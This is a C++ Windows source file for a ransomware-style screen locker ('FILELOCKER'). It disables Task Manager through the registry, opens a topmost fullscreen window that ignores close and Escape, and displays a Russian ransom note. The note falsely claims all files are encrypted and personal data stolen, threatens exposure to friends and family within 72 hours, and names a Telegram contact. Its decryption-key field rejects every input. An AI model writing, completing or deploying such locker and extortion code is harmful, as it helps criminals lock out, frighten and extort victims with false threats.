// language: C++, file: wall.cpp, target: Windows x64
#include <windows.h>
#include <string>

// === ТВОЙ ASCII-АРТ ===
static const wchar_t* kArt[] = {
    L"@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@*--=+*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@%%---=*#%%%%@@@@@@@@@@#=+@%%+-=*%@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@%++%%%##*+=-=+*#%%@@@@%=-%@@@%#+:*%@@@@@@@%%%#*++++===---=++=*@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@#-%@@@@@@@@@%%*-:=+##%%#=+%@@@@@%*=#%@%%#*+::+*#%%%@@@@@@@%%+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@#-%@@@@@@@@@@@@@%%%#-:-+*--#%@@@@@#=+*==*%%%@@@@@@@@@@@@@@@#+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@#-%@@@@@@@@@@@@@@%%#=::=+**#%@@@@@@#*#%%@@@@@@@@@@@@@@@@@@%*=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@#:%@@@@@@@@@@@@@%*:-#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@#=*%@@@@@@@@@@%*:-%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@%#:#@@@@@@@@@@%:.:=++***#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#:+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#",
    L"@@@@@@@@@@@%-+#%@@@@@@@@@@%#*=:.+#%%@@@@%##%%@@@@@@@@@@@@@@@@@@@@%%:=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%",
    L"@@@@@@@@@@@%%.=#%%@@@@@@%%%%##%%%@@@@@@@%#++%@%%@@@@@@@@@@@@@@@@%#:+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@*-=*#%%@@%#-..   =%@@@@@@@@@%%+....-*%@@@@@@@@@@@%%+:+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@*-=**#%%*..*-    +%@@@@@@@%*    .+= .*%@@@@@@%%#*=:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@#-:+*%+.-%+     .*@@@@@@@%*      ##..#@@@%%#**+:=%@@@@@@@@@@@@@@%%%%%%%%%@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@%*+*+:-*: %%-     .*@@@@@@@%=      +%*.=@@@#*++--#%@@@@@@@@@@@@%#*++======+*#%@@@@@@@@@",
    L"@@@@@@@@@@@@@@*+%#*=+-.%%-     =%@@@@@@@%-      *%#:-@@%*=:=#%@@@@@@@@@@@@%#+-#%@@@@@@@%*==#%@@@@@@@",
    L"@@@@@@@@@@@@@@%==%@@%#-*%#.   :#%%@@@@@@%+     -%%*-*@%*:::::+#@@@@@@@@@@%*:+%@@@@@@@@@@@%#-+#%@@@@@",
    L"@@@@@@@@@@@@@@@#+=*%%%%#%%%#*#%+..=%@@@@@%*...+%%%+*%@@@%%%#:*%@@@@@@@%%%#:-%@@@@@@@@@@@@@%%-=#@@@@@",
    L"@@@@@@@@@@@@@@@@@%-#%#**#%%@@@@%##%%@@@@@@@@@@%%#**#%@@@@%*-+%@@@@@@%%#=:=+#@@@@@@@@@@@@@@@%%-=%@@@@",
    L"@@@@@@@@@@@@@@@@%*-%###%%@@@@@@@@%%%%@@@@@@@@@%%%*#%%@@%=--#@@@@@@@%#=+%%@@@@@@@@@@@@@@@@@@@%=-%@@@@",
    L"@@@@@@@@@@@@@@@@#-#%%#==*#%%@@@@%*+=*%@@@@@@@@@%%%%%%@@#.+%@@@@@@@@%-:---+#%%%%%@@@@@@@@@@@@%*-#@@@@",
    L"@@@@@@@@@@@@@@@@#-=-====+:.=*%%%%%%@@@@@@%%%%#*-...:+#%#-+@@@@@@@@@@@@@%%*-.=**#%@@@@@@@@@@@%*=*#%@@",
    L"@@@@@@@@@@@@@@@@%%%%@@@@@%%+--:::=++*####*--=+*##*+::#%##%@@@@@@@@@@@@@@@@%%*-=*%@@@@@@@@@@@%+=+:%@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@%*=+%%%%#**********##%%@@@#=+%@@@@@@@@@@@@@@@@@@@@@@@%=:#%@@@@@@@@@%#+*==%@%",
    L"@@@@@@@@@@@@@@@@@@@@@@@@%#==#=#%@@%%%###%%@@@@@@@@%*=%@@@@@@@@@@@@@@@@@@@@@@@%#:#%@@@@@@@@@%%%*:#%@*",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@%+--:=%@@@@@@@@@@@@@@@@@@#+#@@@@@@@@@@@@@@@@@@@@@@@%#:*%@@@@@@@@@@@@#==@@@=",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@+=#+=%%%%@@@@@@@@@@@@@@%-.*@@@@@@@@@@@@@@@@@@@@@@%#+=%@@@@@@@@@@@@%=-%@@@*",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@=-*:%#***%@@@@%#@@@@@@@%. =@@@@@@@@@@@@@@@@@@@@@%*-=%@@@@@@@@@@@@%=-#@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@+=#--**#%@@@@%*=%@@@@@@*::=%@@@@@@@@@@@@@@@@@@%#+=#%@@@@@@@@@@@%#-=#@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@+=%%+*%%@@@@@*-#@@@@@@%-*%*:+*#%%%@@@@@@@@@%#*=-#%@@@@@@@@@@@%#+:*%@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@+-#@%=*%@@@@@+:%@@@@@%*-#@%%%*+--=*%%@@@%%*-.=%%@@@@@@@@@@%%*-:#%@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@#-+@@%=#@@@@%+-@@@@@@#:#%@@@@@@@%%#+-===--+#%@@@@@@@@@@%%*.:+#%@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@%=-%@%-*@@@@%+=@@@@@@#-##%@@@@@%%%@@%*-+###%%@@%%%#*+-=+**-+%@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@%%#*:.#%%*=#@@@%==@@@@@@#--*%%#*+=--=+*%%%*:+*%%%%:..:=*%%%#*=+%@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@%%%#+:-+=-##@@%*-#%@%=+@@@@@%#.*+-.--===+==-::=#*..=+**-+%@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@%%*=::---:===%@@@@%+:+#*+#@@@@%#:+:-=++++++++++++=.=+:+**+*#%@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@%#=.-=+++++++:=%%@@@%#+-..+@@@@@%+:.=+++++++++++++++=:::.=%@@@@@@@@@@@@@@@@@@@@@@@@@@@%",
    L"@@@@@@@@@@@%#+=*###*++++++-=%@@@@@%**:=%@@@@@#+:++++***#####*++++++...-*@@@@@@@@@@@@@@@@@@@@@@@@@@@#",
    L"@@@@@@@@@@%#.*%@%%%%#*++++--%%@@@@%**.+%@@@@@*:=+*#%%%%%%%%%%%#*+++=.:==@@@@@@@@@@@@@@@@@@@@@@@@@@@#",
    L"@@@@@@@@@%*:**##%%%%%%#+++=-#%@@@%%**:+%@@@@@+:#%%@@%%%%%%%%@%%%#++=.-=+@@@@@@@@@@@@@@@@@@@@@@@@@@@%",
    L"@@@@@@@@%=.=+++++*%%%%%#+++-+%@@@%#**:+%@@@@%+:%%%%%%##***##%%%%%#+-::-=%@@@@@@@@@@@@@@@@@@@@@@@@@@%",
    L"@@@@@@%%+:+++++++++#%%%%#=-:+%@%%#***.=%@@@@%=.%%%#+++++++++++#%%%#:+-+++%%%%%%%%%%%%%%%@@@@@@@@@@@@",
    L"@@@@@@@*-*%%#*++++++**=-+#%%@@@%****+.+%@@@@%+:%*+++++++++++++++*#=-+=*#:***************#%@@@@@@@@@#",
    L"@@@@@@@+=#@@%%%#+++--+#%@@@@@@@@%#**=.*@@@@@@*.=+++++++++++++++++=-+-:*#.+*********####%%@@@@@@@@@@*",
    L"@@@@@@@%-+%@@%%%%*:=-*%##%@%%@@@@@%*.#%@@@@@@%=.++++++**####**++=:++:.::+*#%%%%%@@@@@@@@@@@@@@@@@@@*",
    L"@@@@@%%%#=-*%%%%%#:-#*-#%@%+*@@@@%#-*%@@@@@@@%#-.=+*#%%%%%@%%%%#*=%+:=++**#%@@@@@@@@@@@@@@@@@@@@@@@%",
    L"@@%%##***++-:::---..==*@@@+=%@@@%*-*+%@%%%@@%%%%=.+%%%%@@@@%%%#*++*:+*****%%@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@#***************+=..=###=:#%%#-.=-%%@*=%@@#+#%%::-*%%%%%%##+++=-=+****%%@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@%%%%%%#########****+++====:--==:-=%@%**@@@*=#%+-++=::-====-:::=+****#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@%%%%%%%%######**+=::+*+:*#*+---=+*####*++=++*###%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    L"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##********##%%%%@@%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
};
static constexpr int kArtLines = sizeof(kArt) / sizeof(kArt[0]);

// === ЖЁСТКАЯ ЗАПИСКА ===
static const wchar_t* kNote[] = {
    L"ВСЕ ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ.",
    L"ТВОЯ ЦИФРОВАЯ ЖИЗНЬ ТЕПЕРЬ ПРИНАДЛЕЖИТ МНЕ.",
    L"",
    L"Я ЗНАЮ О ТЕБЕ ВСЁ.",
    L"ВСЕ ТВОИ ФОТО, ПАРОЛИ, ПЕРЕПИСКИ И ДОКУМЕНТЫ - У МЕНЯ.",
    L"",
    L"ЕСЛИ НЕ ХОЧЕШЬ, ЧТОБЫ ТВОЙ ID УЛЕТЕЛ В СЕТЬ, ЧТОБЫ О ТЕБЕ",
    L"УЗНАЛИ ВСЕ ТВОИ ДРУЗЬЯ И СЕМЬЯ - У ТЕБЯ 72 ЧАСА.",
    L"ПОПЫТАЕШЬСЯ ВОССТАНОВИТЬ САМ - КЛЮЧ СГОРИТ НАВСЕГДА.",
    L"",
    L"СВЯЗЬ: @flk_recover (Telegram)",
    L"ТВОЙ ID: FLK-СКРЫТО-В-ФАЙЛАХ",
};
static constexpr int kNoteLines = sizeof(kNote) / sizeof(kNote[0]);

static int g_showNote = 0;
static wchar_t g_password[32] = {0};
static int g_pwdLen = 0;
static bool g_error = false;

static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT r; GetClientRect(h, &r);
        
        HBRUSH bg = CreateSolidBrush(RGB(6, 6, 10));
        FillRect(dc, &r, bg); DeleteObject(bg);
        SetBkMode(dc, TRANSPARENT);

        int cx = r.right - r.left, cy = r.bottom - r.top;
        
        if (g_showNote == 0) {
            // --- СЦЕНА 1: ТОЛЬКО АРТ ---
            int art_fs = cy / (kArtLines + 4); 
            HFONT f_art = CreateFontW(-art_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
            HFONT old = (HFONT)SelectObject(dc, f_art);
            
            TEXTMETRICW tm; GetTextMetricsW(dc, &tm);
            int lh = tm.tmHeight + 1;
            int art_y = (cy - (kArtLines * lh)) / 2;

            SetTextColor(dc, RGB(160, 20, 20));
            for (int i = 0; i < kArtLines; ++i) {
                SIZE s{}; GetTextExtentPoint32W(dc, kArt[i], (int)wcslen(kArt[i]), &s);
                int x = (cx - s.cx) / 2; if (x < 0) x = 0;
                TextOutW(dc, x, art_y, kArt[i], (int)wcslen(kArt[i]));
                art_y += lh;
            }
            SelectObject(dc, old); DeleteObject(f_art);
            
        } else {
            // --- СЦЕНА 2: ТЕКСТ + ПОЛЕ ПАРОЛЯ ---
            int note_fs = cy / 45; 
            HFONT f_note = CreateFontW(-note_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
            HFONT old = (HFONT)SelectObject(dc, f_note);
            
            TEXTMETRICW tm; GetTextMetricsW(dc, &tm);
            int note_lh = tm.tmHeight + 4;

            int box_w = cx / 1.5; 
            int box_h = (kNoteLines * note_lh) + 140; 
            int box_x = (cx - box_w) / 2;
            int box_y = (cy - box_h) / 2;

            HBRUSH box_bg = CreateSolidBrush(RGB(10, 10, 10));
            RECT box_rect = { box_x, box_y, box_x + box_w, box_y + box_h };
            FillRect(dc, &box_rect, box_bg);
            DeleteObject(box_bg);

            HPEN border = CreatePen(PS_SOLID, 4, RGB(255, 0, 0));
            HBRUSH null_brush = (HBRUSH)GetStockObject(NULL_BRUSH);
            SelectObject(dc, border);
            SelectObject(dc, null_brush);
            Rectangle(dc, box_x, box_y, box_x + box_w, box_y + box_h);
            DeleteObject(border);

            SetTextColor(dc, RGB(255, 40, 40));
            int text_y = box_y + 30;
            for (int i = 0; i < kNoteLines; ++i) {
                SIZE s{}; GetTextExtentPoint32W(dc, kNote[i], (int)wcslen(kNote[i]), &s);
                int text_x = box_x + (box_w - s.cx) / 2; 
                if (text_x < box_x + 20) text_x = box_x + 20; 
                TextOutW(dc, text_x, text_y, kNote[i], (int)wcslen(kNote[i]));
                text_y += note_lh;
            }

            // Поле ввода
            text_y += 20;
            std::wstring hint = L"ВВЕДИТЕ КЛЮЧ ДЛЯ РАСШИФРОВКИ:";
            SetTextColor(dc, RGB(200, 200, 200));
            TextOutW(dc, box_x + 30, text_y, hint.c_str(), (int)hint.length());
            text_y += note_lh + 10;

            // Рамка вокруг поля
            HPEN pwd_border = CreatePen(PS_SOLID, 2, RGB(100, 100, 100));
            SelectObject(dc, pwd_border);
            Rectangle(dc, box_x + 30, text_y, box_x + box_w - 30, text_y + note_lh + 10);
            DeleteObject(pwd_border);

            // Текст в поле
            if (g_error) {
                SetTextColor(dc, RGB(255, 0, 0));
                std::wstring err = L"ОШИБКА. КЛЮЧ НЕВЕРЕН.";
                TextOutW(dc, box_x + 40, text_y + 5, err.c_str(), (int)err.length());
            } else {
                SetTextColor(dc, RGB(255, 255, 255));
                std::wstring masked(g_pwdLen, L'*');
                TextOutW(dc, box_x + 40, text_y + 5, masked.c_str(), g_pwdLen);
            }

            SelectObject(dc, old); DeleteObject(f_note);
        }

        EndPaint(h, &ps);
        return 0;
    }
    
    if (m == WM_TIMER) {
        g_showNote = 1;
        KillTimer(h, 1); 
        InvalidateRect(h, nullptr, TRUE); 
        return 0;
    }

    if (m == WM_CHAR && g_showNote == 1) {
        if (w == VK_BACK) {
            if (g_pwdLen > 0) { g_pwdLen--; g_password[g_pwdLen] = 0; }
        } else if (w >= 32 && g_pwdLen < 31) {
            g_password[g_pwdLen++] = (wchar_t)w;
            g_password[g_pwdLen] = 0;
        }
        g_error = false; 
        InvalidateRect(h, nullptr, FALSE);
        return 0;
    }

    if (m == WM_KEYDOWN && g_showNote == 1) {
        if (w == VK_RETURN) {
            g_error = true;
            g_pwdLen = 0;
            g_password[0] = 0;
            InvalidateRect(h, nullptr, FALSE);
            return 0;
        }
    }
    
    if (m == WM_CLOSE || m == WM_DESTROY) return 0;
    if (m == WM_KEYDOWN && w == VK_ESCAPE) return 0;
    return DefWindowProcW(h, m, w, l);
}

int APIENTRY wWinMain(HINSTANCE h, HINSTANCE, LPWSTR, int) {
    HKEY k;
    RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &k);
    DWORD v = 1;
    RegSetValueExW(k, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(k);

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = h;
    wc.lpszClassName = L"FLKWall";
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassW(&wc);

    HWND win = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"FLKWall", L"FILELOCKER", WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, h, nullptr);

    ShowWindow(win, SW_SHOWMAXIMIZED);
    UpdateWindow(win);

    SetTimer(win, 1, 7000, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
